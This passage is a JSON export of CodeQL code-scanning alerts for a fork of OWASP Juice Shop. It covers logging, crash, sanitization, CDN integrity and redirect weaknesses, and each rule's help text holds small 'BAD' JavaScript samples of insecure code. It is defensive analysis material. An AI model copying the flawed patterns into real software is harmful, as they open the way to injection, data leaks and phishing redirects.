context."},"location":{"path":"lib/insecurity.ts","start_line":55,"end_line":55,"start_column":51,"end_column":69},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/73/instances","dismissal_approved_by":null},{"number":72,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/72","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/72","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/clear-text-logging","severity":"error","description":"Clear-text logging of sensitive information","name":"js/clear-text-logging","tags":["external/cwe/cwe-312","external/cwe/cwe-359","external/cwe/cwe-532","security"],"full_description":"Logging sensitive information without encryption or hashing can expose it to an attacker.","help":"# Clear-text logging of sensitive information\nIf sensitive data is written to a log entry it could be exposed to an attacker who gains access to the logs.\n\nPotential attackers can obtain sensitive user data when the log output is displayed. Additionally that data may expose system information such as full path names, system information, and sometimes usernames and passwords.\n\n\n## Recommendation\nSensitive data should not be logged.\n\n\n## Example\nIn the example the entire process environment is logged using \\`console.info\\`. Regular users of the production deployed application should not have access to this much information about the environment configuration.\n\n\n```javascript\n// BAD: Logging cleartext sensitive data\nconsole.info(`[INFO] Environment: ${JSON.stringify(process.env)}`);\n\n```\nIn the second example the data that is logged is not sensitive.\n\n\n```javascript\nlet not_sensitive_data = { a: 1, b : 2} \n// GOOD: it is fine to log data that is not sensitive\nconsole.info(`[INFO] Some object contains: ${JSON.stringify(not_sensitive_data)}`);\n```\n\n## References\n* OWASP: [Insertion of Sensitive Information into Log File](https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/).\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This logs sensitive data returned by an access to changePasswordBenderChallenge as clear text.\nThis logs sensitive data returned by an access to weakPasswordChallenge as clear text.\nThis logs sensitive data returned by an access to dlpPasswordSprayingChallenge as clear text.\nThis logs sensitive data returned by an access to oauthUserPasswordChallenge as clear text.\nThis logs sensitive data returned by an access to resetPasswordJimChallenge as clear text.\nThis logs sensitive data returned by an access to resetPasswordBenderChallenge as clear text.\nThis logs sensitive data returned by an access to resetPasswordBjoernChallenge as clear text.\nThis logs sensitive data returned by an access to resetPasswordMortyChallenge as clear text.\nThis logs sensitive data returned by an access to resetPasswordBjoernOwaspChallenge as clear text.\nThis logs sensitive data returned by an access to resetPasswordUvoginChallenge as clear text.\nThis logs sensitive data returned by an access to passwordRepeatChallenge as clear text."},"location":{"path":"lib/antiCheat.ts","start_line":76,"end_line":76,"start_column":15,"end_column":659},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/72/instances","dismissal_approved_by":null},{"number":71,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/71","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/71","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/server-crash","severity":"warning","description":"Server crash","name":"js/server-crash","tags":["external/cwe/cwe-248","external/cwe/cwe-730","security"],"full_description":"A server that can be forced to crash may be vulnerable to denial-of-service attacks.","help":"# Server crash\nServers handle requests from clients until terminated deliberately by a server administrator. A client request that results in an uncaught server-side exception causes the current server response generation to fail, and should not have an effect on subsequent client requests.\n\nUnder some circumstances, uncaught exceptions can however cause the entire server to terminate abruptly. Such a behavior is highly undesirable, especially if it gives malicious users the ability to turn off the server at will, which is an efficient denial-of-service attack.\n\n\n## Recommendation\nEnsure that the processing of client requests can not cause uncaught exceptions to terminate the entire server abruptly.\n\n\n## Example\nThe following server code checks if a client-provided file path is valid before saving data to that path. It would be reasonable to expect that the server responds with an error in case the request contains an invalid file path. However, the server instead throws an exception, which is uncaught in the context of the asynchronous callback invocation (`fs.access(...)`). This causes the entire server to terminate abruptly.\n\n\n```javascript\nconst express = require(\"express\"),\n  fs = require(\"fs\");\n\nfunction save(rootDir, path, content) {\n  if (!isValidPath(rootDir, req.query.filePath)) {\n    throw new Error(`Invalid filePath: ${req.query.filePath}`); // BAD crashes the server\n  }\n  // write content to disk\n}\n\nexpress().post(\"/save\", (req, res) => {\n  fs.access(rootDir, (err) => {\n    if (err) {\n      console.error(\n        `Server setup is corrupted, ${rootDir} cannot be accessed!`\n      );\n      res.status(500);\n      res.end();\n      return;\n    }\n    save(rootDir, req.query.path, req.body);\n    res.status(200);\n    res.end();\n  });\n});\n\n```\nTo remedy this, the server can catch the exception explicitly with a `try/catch` block, and generate an appropriate error response instead:\n\n\n```javascript\n// ...\nexpress().post(\"/save\", (req, res) => {\n  fs.access(rootDir, (err) => {\n    // ...\n    try {\n      save(rootDir, req.query.path, req.body); // GOOD exception is caught below\n      res.status(200);\n      res.end();\n    } catch (e) {\n      res.status(500);\n      res.end();\n    }\n  });\n});\n\n```\nTo simplify exception handling, it may be advisable to switch to async/await syntax instead of using callbacks, which allows wrapping the entire request handler in a `try/catch` block:\n\n\n```javascript\n// ...\nexpress().post(\"/save\", async (req, res) => {\n  try {\n    await fs.promises.access(rootDir);\n    save(rootDir, req.query.path, req.body); // GOOD exception is caught below\n    res.status(200);\n    res.end();\n  } catch (e) {\n    res.status(500);\n    res.end();\n  }\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-248](https://cwe.mitre.org/data/definitions/248.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The server of this route handler will terminate when an uncaught exception from this location escapes an asynchronous callback."},"location":{"path":"routes/videoHandler.ts","start_line":53,"end_line":53,"start_column":24,"end_column":33},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/71/instances","dismissal_approved_by":null},{"number":70,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/70","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/70","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/server-crash","severity":"warning","description":"Server crash","name":"js/server-crash","tags":["external/cwe/cwe-248","external/cwe/cwe-730","security"],"full_description":"A server that can be forced to crash may be vulnerable to denial-of-service attacks.","help":"# Server crash\nServers handle requests from clients until terminated deliberately by a server administrator. A client request that results in an uncaught server-side exception causes the current server response generation to fail, and should not have an effect on subsequent client requests.\n\nUnder some circumstances, uncaught exceptions can however cause the entire server to terminate abruptly. Such a behavior is highly undesirable, especially if it gives malicious users the ability to turn off the server at will, which is an efficient denial-of-service attack.\n\n\n## Recommendation\nEnsure that the processing of client requests can not cause uncaught exceptions to terminate the entire server abruptly.\n\n\n## Example\nThe following server code checks if a client-provided file path is valid before saving data to that path. It would be reasonable to expect that the server responds with an error in case the request contains an invalid file path. However, the server instead throws an exception, which is uncaught in the context of the asynchronous callback invocation (`fs.access(...)`). This causes the entire server to terminate abruptly.\n\n\n```javascript\nconst express = require(\"express\"),\n  fs = require(\"fs\");\n\nfunction save(rootDir, path, content) {\n  if (!isValidPath(rootDir, req.query.filePath)) {\n    throw new Error(`Invalid filePath: ${req.query.filePath}`); // BAD crashes the server\n  }\n  // write content to disk\n}\n\nexpress().post(\"/save\", (req, res) => {\n  fs.access(rootDir, (err) => {\n    if (err) {\n      console.error(\n        `Server setup is corrupted, ${rootDir} cannot be accessed!`\n      );\n      res.status(500);\n      res.end();\n      return;\n    }\n    save(rootDir, req.query.path, req.body);\n    res.status(200);\n    res.end();\n  });\n});\n\n```\nTo remedy this, the server can catch the exception explicitly with a `try/catch` block, and generate an appropriate error response instead:\n\n\n```javascript\n// ...\nexpress().post(\"/save\", (req, res) => {\n  fs.access(rootDir, (err) => {\n    // ...\n    try {\n      save(rootDir, req.query.path, req.body); // GOOD exception is caught below\n      res.status(200);\n      res.end();\n    } catch (e) {\n      res.status(500);\n      res.end();\n    }\n  });\n});\n\n```\nTo simplify exception handling, it may be advisable to switch to async/await syntax instead of using callbacks, which allows wrapping the entire request handler in a `try/catch` block:\n\n\n```javascript\n// ...\nexpress().post(\"/save\", async (req, res) => {\n  try {\n    await fs.promises.access(rootDir);\n    save(rootDir, req.query.path, req.body); // GOOD exception is caught below\n    res.status(200);\n    res.end();\n  } catch (e) {\n    res.status(500);\n    res.end();\n  }\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-248](https://cwe.mitre.org/data/definitions/248.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The server of this route handler will terminate when an uncaught exception from this location escapes an asynchronous callback."},"location":{"path":"routes/userProfile.ts","start_line":23,"end_line":23,"start_column":24,"end_column":33},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/70/instances","dismissal_approved_by":null},{"number":69,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/69","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/69","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/incomplete-sanitization","severity":"warning","description":"Incomplete string escaping or encoding","name":"js/incomplete-sanitization","tags":["correctness","external/cwe/cwe-020","external/cwe/cwe-080","external/cwe/cwe-116","security"],"full_description":"A string transformer that does not replace or escape all occurrences of a meta-character may be ineffective.","help":"# Incomplete string escaping or encoding\nSanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.\n\nHowever, directly using the string `replace` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.\n\nIn the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.\n\nEven if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.\n\n\n## Recommendation\nUse a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.\n\nOtherwise, make sure to use a regular expression with the `g` flag to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.\n\n\n## Example\nFor example, assume that we want to embed a user-controlled string `accountNumber` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following function attempts to ensure this by doubling single quotes, and thereby escaping them:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(\"'\", \"''\");\n}\n\n```\nAs written, this sanitizer is ineffective: if the first argument to `replace` is a string literal (as in this case), only the *first* occurrence of that string is replaced.\n\nAs mentioned above, the function `escapeQuotes` should be replaced with a purpose-built sanitization library, such as the npm module `sqlstring`. Many other sanitization libraries are available from npm and other sources.\n\nIf this is not an option, `escapeQuotes` should be rewritten to use a regular expression with the `g` (\"global\") flag instead:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(/'/g, \"''\");\n}\n\n```\nNote that it is very important to include the global flag: `s.replace(/'/, \"''\")` *without* the global flag is equivalent to the first example above and only replaces the first quote.\n\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* npm: [sqlstring](https://www.npmjs.com/package/sqlstring) package.\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This replaces only the first occurrence of '..'."},"location":{"path":"server.ts","start_line":247,"end_line":247,"start_column":28,"end_column":48},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/69/instances","dismissal_approved_by":null},{"number":68,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/68","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/68","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/incomplete-sanitization","severity":"warning","description":"Incomplete string escaping or encoding","name":"js/incomplete-sanitization","tags":["correctness","external/cwe/cwe-020","external/cwe/cwe-080","external/cwe/cwe-116","security"],"full_description":"A string transformer that does not replace or escape all occurrences of a meta-character may be ineffective.","help":"# Incomplete string escaping or encoding\nSanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.\n\nHowever, directly using the string `replace` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.\n\nIn the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.\n\nEven if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.\n\n\n## Recommendation\nUse a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.\n\nOtherwise, make sure to use a regular expression with the `g` flag to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.\n\n\n## Example\nFor example, assume that we want to embed a user-controlled string `accountNumber` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following function attempts to ensure this by doubling single quotes, and thereby escaping them:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(\"'\", \"''\");\n}\n\n```\nAs written, this sanitizer is ineffective: if the first argument to `replace` is a string literal (as in this case), only the *first* occurrence of that string is replaced.\n\nAs mentioned above, the function `escapeQuotes` should be replaced with a purpose-built sanitization library, such as the npm module `sqlstring`. Many other sanitization libraries are available from npm and other sources.\n\nIf this is not an option, `escapeQuotes` should be rewritten to use a regular expression with the `g` (\"global\") flag instead:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(/'/g, \"''\");\n}\n\n```\nNote that it is very important to include the global flag: `s.replace(/'/, \"''\")` *without* the global flag is equivalent to the first example above and only replaces the first quote.\n\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* npm: [sqlstring](https://www.npmjs.com/package/sqlstring) package.\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This does not escape backslash characters in the input."},"location":{"path":"lib/utils.ts","start_line":48,"end_line":48,"start_column":24,"end_column":39},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/68/instances","dismissal_approved_by":null},{"number":67,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:17:21Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/67","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/67","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/incomplete-sanitization","severity":"warning","description":"Incomplete string escaping or encoding","name":"js/incomplete-sanitization","tags":["correctness","external/cwe/cwe-020","external/cwe/cwe-080","external/cwe/cwe-116","security"],"full_description":"A string transformer that does not replace or escape all occurrences of a meta-character may be ineffective.","help":"# Incomplete string escaping or encoding\nSanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.\n\nHowever, directly using the string `replace` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.\n\nIn the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.\n\nEven if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.\n\n\n## Recommendation\nUse a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.\n\nOtherwise, make sure to use a regular expression with the `g` flag to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.\n\n\n## Example\nFor example, assume that we want to embed a user-controlled string `accountNumber` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following function attempts to ensure this by doubling single quotes, and thereby escaping them:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(\"'\", \"''\");\n}\n\n```\nAs written, this sanitizer is ineffective: if the first argument to `replace` is a string literal (as in this case), only the *first* occurrence of that string is replaced.\n\nAs mentioned above, the function `escapeQuotes` should be replaced with a purpose-built sanitization library, such as the npm module `sqlstring`. Many other sanitization libraries are available from npm and other sources.\n\nIf this is not an option, `escapeQuotes` should be rewritten to use a regular expression with the `g` (\"global\") flag instead:\n\n\n```javascript\nfunction escapeQuotes(s) {\n  return s.replace(/'/g, \"''\");\n}\n\n```\nNote that it is very important to include the global flag: `s.replace(/'/, \"''\")` *without* the global flag is equivalent to the first example above and only replaces the first quote.\n\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* npm: [sqlstring](https://www.npmjs.com/package/sqlstring) package.\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This replaces only the first occurrence of /\"|'|;|and|or/i."},"location":{"path":"data/static/codefixes/unionSqlInjectionChallenge_1.ts","start_line":5,"end_line":5,"start_column":5,"end_column":21},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/67/instances","dismissal_approved_by":null},{"number":66,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/66","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/66","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/functionality-from-untrusted-source","severity":"warning","description":"Inclusion of functionality from an untrusted source","name":"js/functionality-from-untrusted-source","tags":["external/cwe/cwe-830","security"],"full_description":"Including functionality from an untrusted source may allow an attacker to control the functionality and execute arbitrary code.","help":"# Inclusion of functionality from an untrusted source\nIncluding a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element or an `iframe` element) on a page, it is important to ensure that the received data is not malicious.\n\nWhen including external resources, it is possible to verify that the responding server is the intended one by using an `https` URL. This prevents a MITM (man-in-the-middle) attack where an attacker might have been able to spoof a server response.\n\nEven when `https` is used, an attacker might still compromise the server. When you use a `script` element, you can check for subresource integrity - that is, you can check the contents of the data received by supplying a cryptographic digest of the expected sources to the `script` element. The script will only load sources that match the digest and an attacker will be unable to modify the script even when the server is compromised.\n\nSubresource integrity (SRI) checking is commonly recommended when importing a fixed version of a library - for example, from a CDN (content-delivery network). Then, the fixed digest of that version of the library can easily be added to the `script` element's `integrity` attribute.\n\nA dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as those for the content generated for major browers used by your users.\n\nSee the \\[\\`CUSTOMIZING.md\\`\\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of hostnames required to use SRI by this query.\n\n\n## Recommendation\nWhen an `iframe` element is used to embed a page, it is important to use an `https` URL.\n\nWhen using a `script` element to load a script, it is important to use an `https` URL and to consider checking subresource integrity.\n\n\n## Example\nThe following example loads the jQuery library from the jQuery CDN without using `https` and without checking subresource integrity.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"http://code.jquery.com/jquery-3.6.0.slim.min.js\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\nInstead, loading jQuery from the same domain using `https` and checking subresource integrity is recommended, as in the next example.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"https://code.jquery.com/jquery-3.6.0.slim.min.js\" integrity=\"sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\n\n## References\n* MDN: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)\n* Smashing Magazine: [Understanding Subresource Integrity](https://www.smashingmagazine.com/2019/04/understanding-subresource-integrity/)\n* Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Script loaded from content delivery network with no integrity check."},"location":{"path":"frontend/src/index.html","start_line":15,"end_line":15,"start_column":3,"end_column":101},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/66/instances","dismissal_approved_by":null},{"number":65,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/65","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/65","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/functionality-from-untrusted-source","severity":"warning","description":"Inclusion of functionality from an untrusted source","name":"js/functionality-from-untrusted-source","tags":["external/cwe/cwe-830","security"],"full_description":"Including functionality from an untrusted source may allow an attacker to control the functionality and execute arbitrary code.","help":"# Inclusion of functionality from an untrusted source\nIncluding a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element or an `iframe` element) on a page, it is important to ensure that the received data is not malicious.\n\nWhen including external resources, it is possible to verify that the responding server is the intended one by using an `https` URL. This prevents a MITM (man-in-the-middle) attack where an attacker might have been able to spoof a server response.\n\nEven when `https` is used, an attacker might still compromise the server. When you use a `script` element, you can check for subresource integrity - that is, you can check the contents of the data received by supplying a cryptographic digest of the expected sources to the `script` element. The script will only load sources that match the digest and an attacker will be unable to modify the script even when the server is compromised.\n\nSubresource integrity (SRI) checking is commonly recommended when importing a fixed version of a library - for example, from a CDN (content-delivery network). Then, the fixed digest of that version of the library can easily be added to the `script` element's `integrity` attribute.\n\nA dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as those for the content generated for major browers used by your users.\n\nSee the \\[\\`CUSTOMIZING.md\\`\\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of hostnames required to use SRI by this query.\n\n\n## Recommendation\nWhen an `iframe` element is used to embed a page, it is important to use an `https` URL.\n\nWhen using a `script` element to load a script, it is important to use an `https` URL and to consider checking subresource integrity.\n\n\n## Example\nThe following example loads the jQuery library from the jQuery CDN without using `https` and without checking subresource integrity.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"http://code.jquery.com/jquery-3.6.0.slim.min.js\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\nInstead, loading jQuery from the same domain using `https` and checking subresource integrity is recommended, as in the next example.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"https://code.jquery.com/jquery-3.6.0.slim.min.js\" integrity=\"sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\n\n## References\n* MDN: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)\n* Smashing Magazine: [Understanding Subresource Integrity](https://www.smashingmagazine.com/2019/04/understanding-subresource-integrity/)\n* Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Script loaded from content delivery network with no integrity check."},"location":{"path":"frontend/src/index.html","start_line":16,"end_line":16,"start_column":3,"end_column":86},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/65/instances","dismissal_approved_by":null},{"number":64,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/64","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/64","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/server-side-unvalidated-url-redirection","severity":"warning","description":"Server-side URL redirect","name":"js/server-side-unvalidated-url-redirection","tags":["external/cwe/cwe-601","security"],"full_description":"Server-side URL redirection based on unvalidated user input may cause redirection to malicious web sites.","help":"# Server-side URL redirect\nDirectly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.\n\n\n## Recommendation\nTo guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.\n\nIf this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL is on the same host as the current page.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:\n\n\n```javascript\nconst app = require(\"express\")();\n\napp.get(\"/redirect\", function (req, res) {\n  // BAD: a request parameter is incorporated without validation into a URL redirect\n  